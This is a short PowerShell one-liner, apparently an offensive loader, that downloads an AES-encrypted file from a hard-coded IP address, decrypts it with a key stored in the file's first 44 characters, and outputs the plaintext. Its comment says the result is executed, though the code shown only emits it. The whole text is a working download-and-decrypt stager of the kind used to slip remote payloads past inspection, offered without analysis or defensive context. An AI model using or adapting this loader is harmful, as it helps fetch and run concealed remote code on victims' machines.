#One-Liner Powershell script decrypter that use AES
#INPUT: the file that we want to decrypt is saved in $file
#OUTPUT: the decrypted file is saved in $backToPlainText and executed
$file=(New-Object Net.WebClient).downloadstring('http://192.168.1.118/file ');$key=$file.substring(0,44);$bytes=[System.Convert]::FromBase64String($file.substring(44));$IV = $bytes[0..15];$aes = New-Object "System.Security.Cryptography.AesManaged";$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC;$aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros;$aes.BlockSize = 128;$aes.KeySize = 256;$aes.IV = $IV;$aes.Key = [System.Convert]::FromBase64String($key);$decryptor = $aes.CreateDecryptor();$unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);$aes.Dispose();$backToPlainText=[System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0);$backToPlainText;
